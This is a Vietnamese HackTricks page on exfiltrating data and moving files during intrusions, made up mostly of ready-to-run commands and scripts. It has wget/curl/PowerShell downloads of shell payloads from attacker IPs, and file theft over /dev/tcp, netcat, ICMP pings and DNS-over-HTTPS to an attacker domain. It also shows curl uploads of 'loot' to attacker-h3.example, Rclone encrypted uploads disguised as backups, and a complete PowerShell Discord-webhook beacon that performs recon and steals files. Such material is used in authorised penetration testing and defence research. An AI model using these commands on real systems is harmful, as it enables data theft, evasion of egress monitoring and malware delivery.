# Exfiltration

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> Để xem ví dụ từ đầu đến cuối về việc staging dữ liệu thu thập được trong `C:\Users\Public` và exfiltrate bằng Rclone để bắt chước các bản sao lưu hợp pháp, hãy xem quy trình bên dưới.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## Các domain thường được đưa vào danh sách cho phép để exfiltrate thông tin

Truy cập [https://lots-project.com/](https://lots-project.com/) để tìm các domain thường được đưa vào danh sách cho phép có thể bị lợi dụng

## Sao chép\&Dán Base64

**Linux**

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

**Windows**

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## HTTP

**Linux**

```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```

**Windows**

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

### Tải tệp lên

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer in GET và POST (cả headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Module Python [uploadserver](https://pypi.org/project/uploadserver/):

```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```

### **Máy chủ HTTPS**

```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
    print(request.get_json())
    return "OK"
if __name__ == "__main__":
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```

### HTTP/3 / QUIC

Nếu các biện pháp kiểm soát lưu lượng ra được cấu hình để kiểm tra **TCP/443** truyền thống nhưng cho phép **UDP/443**, việc ép dùng **HTTP/3** có thể chuyển luồng truyền sang **QUIC** thay vì TLS-over-TCP. Endpoint của kẻ tấn công cần hỗ trợ HTTP/3 gốc (ví dụ: reverse proxy hoặc endpoint tải lên đã quảng bá `Alt-Svc: h3`).

```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```

Một bài nghiên cứu năm 2025 (QUIC-Exfil) phát hiện rằng các header được mã hóa và việc thay đổi địa chỉ linh hoạt của QUIC có thể khiến việc phát hiện exfiltration ở cấp firewall khó hơn so với các kênh dựa trên TLS hoặc DNS. Nghiên cứu cũng trình diễn phương thức dùng địa chỉ ưu tiên của server để ngụy trang exfiltration thành quá trình di chuyển kết nối phía server.<sup>[[9]](#references)</sup>

### Upload lên object storage bằng URL ký trước / được ủy quyền

Khi có thể tạo hoặc lấy được một **signed URL** có thời hạn ngắn, nạn nhân chỉ cần một HTTPS client thông thường. Cách này tránh phải cài cloud SDK hoặc lưu thông tin xác thực dài hạn trên host.<sup>[[8]](#references)</sup> Cách này cũng có thể hòa lẫn vào lưu lượng object storage phổ biến.

**Linux / macOS (AWS S3 pre-signed `PUT`)**

```bash
curl -X PUT -T loot.7z \
  -H 'Content-Type: application/octet-stream' \
  'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```

**Windows PowerShell (AWS S3 pre-signed `PUT`)**

```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
  -ContentType 'application/octet-stream' `
  -Uri $presignedUrl
```

**Azure Blob SAS URL**

```bash
curl -X PUT --data-binary @loot.7z \
  -H 'x-ms-blob-type: BlockBlob' \
  -H 'Content-Type: application/octet-stream' \
  'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```

Notes:
- Pre-signed URLs / SAS tokens thường giới hạn **path**, **HTTP method** và **thời hạn**.<sup>[[8]](#references)[[10]](#references)</sup>
- Với Azure Blob `Put Blob`, bắt buộc phải có `x-ms-blob-type: BlockBlob`.<sup>[[10]](#references)</sup>
- Cách này hoạt động tốt với `curl`, `Invoke-WebRequest` hoặc bất kỳ implant tùy chỉnh nào có thể gửi `PUT` HTTPS thô.

### goshs

[goshs](https://github.com/patrickhener/goshs) là công cụ thay thế `python3 -m http.server`, được đóng gói trong một binary duy nhất.<sup>[[4]](#references)</sup>
Công cụ này hỗ trợ upload, download, WebDAV, SFTP, SMB, TLS, xác thực, liên kết chia sẻ và các tính năng cộng tác OOB (DNS, SMTP, thu thập NTLM hash).<sup>[[4]](#references)</sup>

```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```

## Webhooks (Discord/Slack/Teams) cho C2 & Exfiltration dữ liệu

Webhook là các endpoint HTTPS chỉ cho phép ghi, chấp nhận JSON và các phần file tùy chọn. Chúng thường được cho phép trên các domain SaaS đáng tin cậy và không yêu cầu OAuth/API key, nên hữu ích để beaconing và exfiltration với ít trở ngại.<sup>[[5]](#references)[[6]](#references)</sup>

Ý chính:
- Endpoint: Discord sử dụng https://discord.com/api/webhooks/<id>/<token>
- POST multipart/form-data với một phần có tên payload_json chứa {"content":"..."} và các phần file tùy chọn có tên file.
- Mẫu vòng lặp của operator: beacon định kỳ -> trinh sát thư mục -> exfiltration file mục tiêu -> dump dữ liệu trinh sát -> ngủ. HTTP 204 NoContent/200 OK xác nhận dữ liệu đã được gửi.

PoC PowerShell (Discord):

```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
    param([string]$Text)
    $payload = @{ content = $Text } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
    param([string]$Path, [string]$Name)
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $mp.Add($fileContent, "file", $Name)
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
    $ctr++
    # Beacon
    $beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
    Send-DiscordText -Text $beacon

    # Every 2nd: quick folder listing
    if ($ctr % 2 -eq 0) {
        $dirs = @("Documents","Desktop","Downloads","Pictures")
        $acc = foreach ($d in $dirs) {
            $p = Join-Path $env:USERPROFILE $d
            $items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
            if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
        }
        Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
    }

    # Every 3rd: targeted exfil
    if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

    # Every 4th: basic recon
    if ($ctr % 4 -eq 0) {
        $who = whoami
        $ip  = ipconfig | Out-String
        $tmp = Join-Path $env:TEMP "recon.txt"
        "whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
        Send-DiscordFile -Path $tmp -Name "recon.txt"
    }

    Start-Sleep -Seconds 20
}
```

Ghi chú:
- Các mẫu tương tự áp dụng cho những nền tảng cộng tác khác (Slack/Teams) dùng incoming webhooks của chúng; điều chỉnh URL và JSON schema cho phù hợp.
- Để xem DFIR về các tạo tác cache của Discord Desktop và việc khôi phục webhook/API, hãy xem trang liên quan bên dưới.<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Tạo tác Registry làm kênh phản hồi

Khi code đã thực thi trong một build worker hoặc documentation worker và có thể xác thực với package registry, chính registry có thể làm kênh phản hồi. Trong các ví dụ GemStuffer, một payload tạo **gem mới** chứa các tệp phản hồi đã lấy được rồi thử đẩy nó qua `/api/v1/gems` của RubyGems; một payload khác ghi phản hồi đã lấy được vào `README.md`, xóa loader `.yardopts` rồi thử phát hành **phiên bản mới của cùng gem**. Cách này khác với hook lúc cài đặt và đòi hỏi thông tin xác thực phát hành hợp lệ cùng quyền truy cập registry đi ra.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Biến thể thứ hai dùng **cấu hình webhook của registry làm nơi lưu trữ**, chứ không phải callback đi ra. Nó nén phản hồi bằng zlib, mã hóa bằng Base64 an toàn cho URL, bỏ phần padding và chia thành các đoạn URL được đánh số, mỗi đoạn dài tối đa 220 ký tự. Với key được phép quản lý webhook, `POST /api/v1/web_hooks` chấp nhận `gem_name` và `url`; `GET /api/v1/web_hooks.json` liệt kê các URL đã lưu cho tài khoản đó. Các đoạn được đánh số cùng dấu kết thúc cho phép người đọc được ủy quyền tái dựng dữ liệu. Host `example.com` trong ví dụ chỉ là chỗ giữ chỗ bên trong giá trị đã lưu, không phải bằng chứng về một C2 endpoint hoạt động hay việc gửi dữ liệu thành công.<sup>[[13]](#references)[[14]](#references)</sup>

```text
POST /api/v1/web_hooks   gem_name=<owned-gem>&url=https://example.com/A000/<chunk>/
GET  /api/v1/web_hooks.json   # read stored URLs using the same account's key
```

Với [đường dẫn thực thi `.yardopts` của YARD](../pentesting-web/dependency-confusion.md#related-pattern-package-controlled-documentation-builds) ban đầu, kênh registry chỉ có thể được dùng sau khi thực thi. Cần quan sát riêng một `POST` thành công hoặc artifact có thể đọc được về sau; các mẫu được trích dẫn chủ yếu cho thấy nỗ lực xuất bản và đăng ký.<sup>[[12]](#references)[[13]](#references)</sup>

## Rclone (exfiltration qua cloud/object-storage)

Các operator hiện đại thường **stage loot cục bộ**, rồi dùng [Rclone](https://rclone.org/) để khiến việc truyền dữ liệu trông giống một tác vụ backup hoặc đồng bộ thông thường. Một mẫu thực tiễn gồm:

1. Một remote thông thường (`s3`, `webdav`, `drive`, `mega`, ...)
2. Một lớp bọc `crypt` để **mã hóa nội dung và tên tệp ở phía client**
3. Một lớp bọc `chunker` tùy chọn nếu nhà cung cấp áp đặt giới hạn kích thước object hoặc bạn muốn chia dữ liệu tải lên thành các phần nhỏ hơn

```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
  --transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```

Notes:
- `crypt` có thể mã hóa cả nội dung lẫn tên tệp.<sup>[[3]](#references)</sup>
- `chunker` tự động chia các tệp lớn thành nhiều phần và ghép lại khi tải xuống.<sup>[[11]](#references)</sup>
- `rclone.conf` lưu các bí mật của `crypt` ở dạng **được làm rối**, không phải hình thức bảo vệ mạnh khi lưu trữ.<sup>[[3]](#references)</sup> Với các thao tác ngắn hạn, hãy ưu tiên dùng một cấu hình tạm riêng và xóa nó sau đó. Nếu buộc phải giữ lâu hơn, hãy ưu tiên xử lý cấu hình được mã hóa (`RCLONE_CONFIG_PASS` / `--password-command`) thay vì để tệp `rclone.conf` chưa được bảo vệ trên ổ đĩa.<sup>[[11]](#references)</sup>
- Nếu mục tiêu đã đồng bộ **OneDrive**, **Google Drive** hoặc **Dropbox**, sao chép loot vào thư mục được đồng bộ có thể tận dụng client đã được phê duyệt sẵn, thay vì đưa vào một binary truyền dữ liệu mới.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP server (python)

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### Máy chủ FTP (NodeJS)

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### FTP server (pure-ftp)

```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### **client Windows**

```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB

Kali làm máy chủ

```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```

Hoặc tạo một smb share **bằng samba**:

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

Windows

```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```

### goshs
[goshs](https://github.com/patrickhener/goshs) là một lựa chọn thay thế dạng binary đơn, dùng để chia sẻ tệp qua SMB và thu thập NTLM hash từ các client kết nối.<sup>[[4]](#references)</sup>

```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```

## SCP

Kẻ tấn công phải đang chạy SSHd.

```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```

## SSHFS

Nếu nạn nhân có SSH, kẻ tấn công có thể mount một thư mục từ máy nạn nhân vào máy của mình.

```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```

## NC

```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```

## /dev/tcp

### Tải tệp từ máy nạn nhân

```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```

### Tải tệp lên nạn nhân

```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

cảm ơn **@BinaryShadow\_**

## **ICMP**

```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## DNS over HTTPS (DoH)

Nếu DNS UDP/53 thông thường quá ồn hoặc bị chặn, nhưng lưu lượng HTTPS đi ra nhìn chung được cho phép, có thể gói mẫu exfiltration bằng nhãn DNS thông thường bên trong các yêu cầu **DoH** gửi đến một resolver công khai. Giữ mỗi nhãn ngắn hơn nhiều so với giới hạn 63 byte và dùng bảng chữ cái an toàn cho DNS như Base32.

```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
  nl -nrz -w4 -s. | while read chunk; do
    curl --http2 -s \
      -H 'accept: application/dns-json' \
      "https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
      >/dev/null
  done
```

Trên authoritative DNS server của `exf.attacker.tld`, sắp xếp các truy vấn theo tiền tố số rồi khôi phục luồng Base32. Cách này giữ lưu lượng trong HTTPS đến resolver thay vì dùng DNS UDP/53 cổ điển.<sup>[[2]](#references)</sup>

Để biết các công cụ DNS tunnel hai chiều đầy đủ (`iodine`, `dnscat2`, v.v.), hãy xem [trang tunneling](tunneling-and-port-forwarding.md).

## **SMTP**

Nếu có thể gửi dữ liệu đến một SMTP server, bạn có thể tạo một SMTP server để nhận dữ liệu bằng python:

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

### goshs

[goshs](https://github.com/patrickhener/goshs) có thể nhanh chóng khởi chạy một SMTP server để bắt các email callback trong các tình huống exfiltration OOB.<sup>[[4]](#references)</sup>

```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```

Email nhận được và callbacks được hiển thị trực tiếp trong đầu ra terminal.
Có thể kết hợp với DNS callback server để có phạm vi OOB đầy đủ:

```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```

## TFTP

Theo mặc định trên XP và 2003 (ở các phiên bản khác, cần thêm thủ công trong quá trình cài đặt)

Trong Kali, **khởi động máy chủ TFTP**:

```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```

**TFTP server bằng Python:**

```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```

Trong **victim**, kết nối đến máy chủ Kali:

```bash
tftp -i <KALI-IP> get nc.exe
```

## PHP

Tải xuống một tệp bằng one-liner PHP:

```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## VBScript

```bash
Attacker> python -m SimpleHTTPServer 80
```

**Nạn nhân**

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe

Chương trình `debug.exe` không chỉ cho phép kiểm tra các binary mà còn có **khả năng dựng lại chúng từ hex**. Điều này có nghĩa là khi cung cấp dữ liệu hex của một binary, `debug.exe` có thể tạo tệp binary. Tuy nhiên, cần lưu ý rằng debug.exe có **giới hạn chỉ có thể lắp ráp các tệp có kích thước tối đa 64 kb**.<sup>[[1]](#references)</sup>

```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

Sau đó, sao chép và dán văn bản vào windows-shell; một tệp có tên nc.exe sẽ được tạo.

## References

- [1] [Chuyển tệp sang Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Backend `crypt` của Rclone](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [Discord làm C2 và bằng chứng được lưu trong bộ nhớ đệm](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Discord Webhooks – Thực thi Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord Forensic Suite (trình phân tích bộ nhớ đệm)](https://github.com/jwdfir/discord_cache_parser)
- [8] [Tải đối tượng lên bằng URL ký trước - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil: Khai thác tính năng Preferred Address của máy chủ trong QUIC để thực hiện các cuộc tấn công đánh cắp dữ liệu](https://arxiv.org/abs/2505.05292)
- [10] [Put Blob (REST API) - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
- [11] [Tài liệu Rclone](https://rclone.org/docs/#configuration-encryption)
- [12] [RubyHack – Điều tra RubyGems và RubyDoc](https://www.rubyhack.ai/)
- [13] [Nghiên cứu bảo mật JFrog – Phân tích GemStuffer](https://research.jfrog.com/post/gemstuffer-openai-rubygems)
- [14] [API RubyGems.org – Các phương thức gem và webhook](https://guides.rubygems.org/rubygems-org-api/)
{{#include ../banners/hacktricks-training.md}}
